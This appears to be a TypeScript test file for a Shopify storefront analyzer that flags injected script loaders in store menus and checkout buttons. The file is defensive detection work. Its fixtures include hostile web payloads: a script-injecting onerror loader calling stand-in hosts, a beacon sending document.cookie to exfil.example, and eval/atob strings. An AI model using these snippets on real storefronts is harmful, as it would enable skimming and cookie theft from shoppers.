/**
 * Checkout guard analyzer (gc-1q1s.2) and the shared loader-payload matcher.
 * Fixture tests lean on false positives: Dawn-family headers, the async CSS
 * onload idiom, image fade-ins, click handlers that open links, JSON-LD in
 * breadcrumbs, and known apps / tag hosts must all stay quiet.
 */
import { describe, it, expect } from "vitest";

import { findMaliciousInHomepage, walkHomepage } from "../../app/services/runtime-malicious.server";
import { findScriptPayload, MAX_PAYLOAD_TEXT } from "../../app/services/script-payload.server";
import {
  findGuardRegions,
  analyzeStorefrontHtml,
  ownStoreHosts,
} from "../../app/services/storefront-analyzer.server";

const page = (body: string, head = "") =>
  `<!doctype html><html><head><script>var Shopify = Shopify || {};Shopify.shop = "x.myshopify.com";</script>${head}</head><body>${body}</body></html>`;

/** The 17TRACK menu-label loader shape (gc-dr7a), with a host of our choosing. */
const loader = (host: string) =>
  `var s=document.createElement('script');s.src='https://${host}/l2.js';document.head.appendChild(s)`;

/** A trimmed Dawn header: header-menu, menu-drawer, cart icon, async CSS. */
const DAWN_HEADER = `
<link rel="stylesheet" href="//x.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css" media="print" onload="this.media='all'">
<sticky-header data-sticky-type="on-scroll-up" class="header-wrapper">
  <header class="header header--middle-left">
    <header-drawer data-breakpoint="tablet">
      <details id="Details-menu-drawer-container" class="menu-drawer-container">
        <summary class="header__icon header__icon--menu" aria-label="Menu"><span><svg aria-hidden="true" focusable="false" class="icon icon-hamburger"><use href="#icon-hamburger"/></svg></span></summary>
        <div id="menu-drawer" class="gradient menu-drawer motion-reduce">
          <menu-drawer><nav class="menu-drawer__navigation"><ul class="menu-drawer__menu has-submenu list-menu" role="list">
            <li><a id="HeaderDrawer-catalog" href="/collections/all" class="menu-drawer__menu-item list-menu__item link link--text focus-inset">Catalog</a></li>
            <li><a id="HeaderDrawer-contact" href="/pages/contact" class="menu-drawer__menu-item list-menu__item link link--text focus-inset">Contact</a></li>
          </ul></nav></menu-drawer>
        </div>
      </details>
    </header-drawer>
    <a href="/" class="header__heading-link link link--text focus-inset"><img src="//x.myshopify.com/cdn/shop/files/logo.png?v=1&width=600" alt="Shop" width="600" height="200" loading="lazy" onload="this.classList.add('loaded')"></a>
    <nav class="header__inline-menu"><header-menu><ul class="list-menu list-menu--inline" role="list">
      <li><a id="HeaderMenu-home" href="/" class="header__menu-item list-menu__item link link--text focus-inset"><span>Home</span></a></li>
      <li><a id="HeaderMenu-catalog" href="/collections/all" class="header__menu-item list-menu__item link link--text focus-inset"><span>Catalog</span></a></li>
    </ul></header-menu></nav>
    <a href="/cart" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble"><span class="visually-hidden">Cart</span></a>
  </header>
</sticky-header>
<nav class="breadcrumb"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":"https://evil-looking.example/x"}]}</script></nav>
<script src="//x.myshopify.com/cdn/shop/t/1/assets/global.js?v=1" defer="defer"></script>
`;

/** A trimmed Dawn cart footer: the checkout button rendered while the cart is empty. */
const DAWN_CART = `
<form action="/cart" method="post" id="cart"><div class="cart__ctas">
  <button type="submit" id="checkout" class="cart__checkout-button button" name="checkout" disabled form="cart">Check out</button>
</div></form>
<div class="additional-checkout-buttons"><div class="dynamic-checkout__content" id="dynamic-checkout-cart" data-shopify="dynamic-checkout-cart"></div></div>
`;

describe("findScriptPayload", () => {
  it.each([
    ["creates_script", loader("evil.example")],
    ["dynamic_import", "import('https://evil.example/m.js')"],
    ["evaluates_code", "eval(x)"],
    ["evaluates_code", "new Function('return 1')()"],
    ["decodes_code", "eval(atob('ZG9jdW1lbnQ='))".replace("eval", "x=")],
    ["decodes_code", "String.fromCharCode(104,105)"],
    ["writes_markup", "document.write('<scr'+'ipt src=//evil.example/a.js></scr'+'ipt>')"],
  ])("matches %s", (reason, text) => {
    expect(findScriptPayload(text)?.reason).toBe(reason);
  });

  it("reports the first non-Shopify host for a fingerprint", () => {
    expect(findScriptPayload(loader("cdn.evil.example"))).toEqual({
      reason: "creates_script",
      host: "cdn.evil.example",
    });
  });

  it.each([
    "this.media='all'",
    "this.media='all'; this.onload = null",
    "this.classList.add('loaded')",
    "this.style.display='none'",
    "this.src='https://cdn.shopify.com/s/files/placeholder.png'",
    "",
  ])("never matches the benign handler %j", (text) => {
    expect(findScriptPayload(text, { urlCounts: true })).toBeNull();
  });

  it("a non-Shopify URL counts only when urlCounts is set (onerror/onload)", () => {
    const open = "window.open('https://wa.me/15551234567')";
    expect(findScriptPayload(open)).toBeNull();
    expect(findScriptPayload(open, { urlCounts: true })).toEqual({
      reason: "external_url",
      host: "wa.me",
    });
  });

  it("reads at most MAX_PAYLOAD_TEXT characters", () => {
    expect(findScriptPayload(`${"a".repeat(MAX_PAYLOAD_TEXT)}eval(x)`)).toBeNull();
  });
});

describe("analyzeStorefrontHtml: false-positive guards", () => {
  it("a Dawn header and empty-cart footer are completely quiet", () => {
    const out = analyzeStorefrontHtml(page(DAWN_HEADER + DAWN_CART), {
      shopHosts: ["x.myshopify.com"],
    });
    expect(out).toEqual({ maliciousHits: [], loaders: [], hosts: [] });
  });

  it("a click handler that opens a chat link is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<button onclick="window.open('https://wa.me/15551234567')">Chat</button>`),
    );
    expect(out.loaders).toEqual([]);
  });

  it("tag hosts on the allowlist, known apps and benign libraries are not new hosts", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>` +
          `<script src="https://connect.facebook.net/en_US/fbevents.js"></script>` +
          `<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>`,
      ),
    );
    expect(out.hosts).toEqual([]);
  });

  it("hosts the latest theme scan already saw are not new", () => {
    const out = analyzeStorefrontHtml(
      page(`<script src="https://widgets.vendor.io/w.js"></script>`),
      {
        knownThemeHosts: new Set(["widgets.vendor.io"]),
      },
    );
    expect(out.hosts).toEqual([]);
  });

  it("links, hints, inline-JS strings and images never make a new host", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<link rel="stylesheet" href="https://fonts.vendor.io/a.css">` +
          `<link rel="preconnect" href="https://pre.vendor.io">` +
          `<script>var cfg = { api: "https://api.vendor.io/v1" };</script>` +
          `<img src="https://img.vendor.io/a.png"><a href="https://blog.vendor.io">blog</a>`,
      ),
    );
    expect(out.hosts).toEqual([]);
  });

  it("a script inside a commented-out menu is not read", () => {
    const out = analyzeStorefrontHtml(
      page(`<!-- <nav><img src=x onerror="${loader("evil.example")}"></nav> -->`),
    );
    expect(out.loaders).toEqual([]);
  });
});

describe("analyzeStorefrontHtml: the store's own hosts (audit fix)", () => {
  const ctx = { shopHosts: ["mystore.com", "mystore.myshopify.com"] };

  it("a theme script served from the store's own domain inside the menu is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="//mystore.com/cdn/shop/t/1/assets/menu.js"></script></nav>`),
      ctx,
    );
    expect(out.loaders).toEqual([]);
  });

  it("an image fallback to the store's own domain is not a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src="/a.png" onerror="this.src='//mystore.com/cdn/shop/files/fallback.png'">`),
      ctx,
    );
    expect(out.loaders).toEqual([]);
  });

  it("an image fallback to any other host is not a loader either (no script, no network call)", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<img src="/a.png" onerror="this.onerror=null;this.src='https://placehold.co/600x400'">`,
      ),
    );
    expect(out.loaders).toEqual([]);
  });

  it("a handler that points at an external .js file is still a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src=x onerror="s.src='https://loader.example/l3.js?v=1'">`),
    );
    expect(out.loaders.map((l) => [l.reason, l.host])).toEqual([
      ["external_url", "loader.example"],
    ]);
  });

  it("a handler that beacons to an external host is a loader", () => {
    const out = analyzeStorefrontHtml(
      page(`<img src=x onload="navigator.sendBeacon('https://exfil.example/c', document.cookie)">`),
    );
    expect(out.loaders[0]).toMatchObject({ reason: "external_url", host: "exfil.example" });
  });

  it("code construction on the store's own host is still a loader, keyed by its reason", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<img src=x onerror="var s=document.createElement('script');s.src='//mystore.com/x.js';document.head.appendChild(s)">`,
      ),
      ctx,
    );
    expect(out.loaders.map((l) => [l.fingerprint, l.host])).toEqual([
      ["SCRIPT_LOADER:creates_script", null],
    ]);
  });

  it("the www twin of the store's own hosts is trusted too (audit fix)", () => {
    for (const src of ["//www.mystore.com/cdn/x.js", "//www.mystore.myshopify.com/x.js"]) {
      const out = analyzeStorefrontHtml(page(`<nav><script src="${src}"></script></nav>`), ctx);
      expect(out.loaders, src).toEqual([]);
    }
    const apex = analyzeStorefrontHtml(
      page(`<nav><script src="//mystore.com/cdn/x.js"></script></nav>`),
      { shopHosts: ["www.mystore.com"] },
    );
    expect(apex.loaders).toEqual([]);
  });

  it("never trusts another parent of the store's hosts", () => {
    expect([...ownStoreHosts(["mystore.myshopify.com", "Shop.Example.co.uk"])].sort()).toEqual([
      "mystore.myshopify.com",
      "shop.example.co.uk",
      "www.mystore.myshopify.com",
      "www.shop.example.co.uk",
    ]);
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://example.co.uk/l.js"></script></nav>`),
      { shopHosts: ["shop.example.co.uk"] },
    );
    expect(out.loaders.map((l) => l.host)).toEqual(["example.co.uk"]);
  });

  it("theme-scan hosts are trusted for menu scripts too", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://menu.vendor.io/m.js"></script></nav>`),
      { knownThemeHosts: new Set(["menu.vendor.io"]) },
    );
    expect(out.loaders).toEqual([]);
  });
});

describe("analyzeStorefrontHtml: signals", () => {
  it("the 17TRACK menu-label loader on a listed domain is KNOWN_MALICIOUS only (no duplicate loader)", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><a href="/x"><img src=x onerror="${loader("cartassure.top")}">Shop</a></nav>`),
    );
    expect(out.maliciousHits.map((h) => h.domain)).toEqual(["cartassure.top"]);
    expect(out.loaders).toEqual([]);
  });

  it("the same loader on an UNLISTED domain is a SCRIPT_LOADER in the store menu", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<nav><a href="/x"><img src=x onerror="${loader("checkout-guard.example")}">Shop</a></nav>`,
      ),
    );
    expect(out.maliciousHits).toEqual([]);
    expect(out.loaders).toEqual([
      {
        fingerprint: "SCRIPT_LOADER:checkout-guard.example",
        host: "checkout-guard.example",
        reason: "creates_script",
        label: "Code in an onerror attribute in your store menu",
      },
    ]);
  });

  it("a loader written into the checkout button label is named as such", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<button type="submit" name="checkout">Check out<img src=x onerror="${loader("pay-verify.example")}"></button>`,
      ),
    );
    expect(out.loaders[0].label).toBe("Code in an onerror attribute in the checkout button");
  });

  it("HTML-encoded payloads are decoded before matching", () => {
    const encoded = `var s=document.createElement(&#39;script&#39;);s.src=&quot;https:&#47;&#47;enc.example&#47;a.js&quot;`;
    const out = analyzeStorefrontHtml(page(`<img src=x onerror="${encoded}">`));
    expect(out.loaders[0]).toMatchObject({ host: "enc.example", reason: "creates_script" });
  });

  it("a host-less loader is keyed by its reason", () => {
    const out = analyzeStorefrontHtml(page(`<svg onload="eval(atob('YWxlcnQoMSk='))"></svg>`));
    expect(out.loaders[0].fingerprint).toBe("SCRIPT_LOADER:evaluates_code");
    expect(out.loaders[0].host).toBeNull();
  });

  it("an external script inside the menu is a loader; a Shopify-hosted one is not", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<nav><script src="https://menu-cdn.example/m.js"></script>` +
          `<script src="//x.myshopify.com/cdn/shop/t/1/assets/menu.js"></script></nav>`,
      ),
    );
    expect(out.loaders.map((l) => [l.reason, l.host])).toEqual([
      ["script_in_menu", "menu-cdn.example"],
    ]);
  });

  it("an inline script inside the checkout button that builds a script is a loader", () => {
    const out = analyzeStorefrontHtml(
      page(
        `<a href="/checkout" class="btn">Checkout<script>${loader("x-pay.example")}</script></a>`,
      ),
    );
    expect(out.loaders[0]).toMatchObject({ reason: "script_in_checkout", host: "x-pay.example" });
  });

  it("collects new script, app script-tag, frame and form hosts once each", () => {
    const head = `<script>function asyncLoad(){var urls = ["https:\\/\\/tags.newapp.io\\/t.js?shop=x.myshopify.com"];}window.attachEvent ? window.attachEvent('onload', asyncLoad) : window.addEventListener('load', asyncLoad, false);</script>`;
    const out = analyzeStorefrontHtml(
      page(
        `<script src="https://new.vendor.io/a.js"></script><script src="https://new.vendor.io/b.js"></script>` +
          `<iframe src="https://frame.vendor.io/x"></iframe><form action="https://collect.vendor.io/p"></form>`,
        head,
      ),
    );
    expect(out.hosts.map((h) => [h.host, h.source])).toEqual([
      ["tags.newapp.io", "script_tag"],
      ["new.vendor.io", "script"],
      ["frame.vendor.io", "iframe"],
      ["collect.vendor.io", "form"],
    ]);
  });

  it("an empty page yields nothing", () => {
    expect(analyzeStorefrontHtml("")).toEqual({ maliciousHits: [], loaders: [], hosts: [] });
  });

  it("Object.prototype names as elements, attributes, handlers and hosts never blind it (gc-7gjj.4 class)", () => {
    // A `<constructor>` tag crashed the homepage walk once (fd9f241); the
    // analyzer reads the same walk plus its own lookups, so every
    // prototype-member name must stay an ordinary name here too.
    for (const name of Object.getOwnPropertyNames(Object.prototype).map((n) => n.toLowerCase())) {
      const tag = /^[a-z]/.test(name) ? name : `x${name}`;
      // A hostname label cannot hold `_`; `__proto__` -> `proto.example`.
      const label = name.replace(/_/g, "");
      const out = analyzeStorefrontHtml(
        page(
          `<${tag} ${name}=1 on${name}="x()" onerror="fetch('https://${name}/a.js')">t</${tag}>` +
            `<script src="https://${label}.example/a.js"></script>` +
            `<nav><img src=x onerror="${loader("checkout-guard.example")}">` +
            `<img src=x onerror="${loader("cartassure.top")}"></nav>`,
        ),
      );
      expect(
        out.maliciousHits.map((h) => h.domain),
        name,
      ).toEqual(["cartassure.top"]);
      expect(
        out.loaders.map((l) => l.host),
        name,
      ).toContain("checkout-guard.example");
      expect(
        out.hosts.map((h) => h.host),
        name,
      ).toContain(`${label}.example`);
    }
  });

  it("stays linear on a large page of handlers (1 MB)", () => {
    const html = page(`<img src=x onload="this.classList.add('a')">`.repeat(25_000));
    const started = Date.now();
    analyzeStorefrontHtml(html);
    expect(Date.now() - started).toBeLessThan(3000);
  });
});

describe("findGuardRegions", () => {
  it("finds menu elements and checkout buttons, not other buttons", () => {
    const kinds = findGuardRegions(
      page(DAWN_HEADER + DAWN_CART + `<button name="add">Add</button>`),
    )
      .map((r) => r.kind)
      .sort();
    expect(kinds.filter((k) => k === "checkout")).toHaveLength(1);
    expect(kinds.filter((k) => k === "menu").length).toBeGreaterThanOrEqual(3);
  });
});

describe("findGuardRegions: an element that never closes (audit fix)", () => {
  it("an unclosed nav or checkout button is no region, so later scripts are not in it", () => {
    for (const open of ["<nav>", '<button name="checkout">Check out']) {
      const html = page(
        `${open}<div>${"x".repeat(5000)}</div><script src="https://cdn.vendor.example/app.js"></script>`,
      );
      expect(findGuardRegions(html), open).toEqual([]);
      expect(analyzeStorefrontHtml(html).loaders, open).toEqual([]);
    }
  });

  it("a closed region still holds its script", () => {
    const out = analyzeStorefrontHtml(
      page(`<nav><script src="https://cdn.vendor.example/app.js"></script></nav>`),
    );
    expect(out.loaders.map((l) => l.reason)).toEqual(["script_in_menu"]);
  });
});

describe("walkHomepage (shared with findMaliciousInHomepage)", () => {
  it("reports every loading host with its source and raw URL, in page order", () => {
    const seen: Array<[string, string, string | null]> = [];
    walkHomepage(
      page(
        `<script src="https://a.example/x.js"></script><link rel="stylesheet" href="https://b.example/c.css">`,
      ),
      ["https://st.example/t.js"],
      { host: (h, s, raw) => seen.push([h, s, raw]) },
    );
    expect(seen).toEqual([
      ["st.example", "script_tag", "https://st.example/t.js"],
      ["a.example", "script", "https://a.example/x.js"],
      ["b.example", "link", "https://b.example/c.css"],
    ]);
  });

  it("findMaliciousInHomepage is unchanged by the refactor (same hit for the same page)", () => {
    expect(
      findMaliciousInHomepage(page(`<img src=x onerror="${loader("cartassure.top")}">`), []),
    ).toEqual([{ domain: "cartassure.top", host: "cartassure.top", source: "event_handler" }]);
  });
});
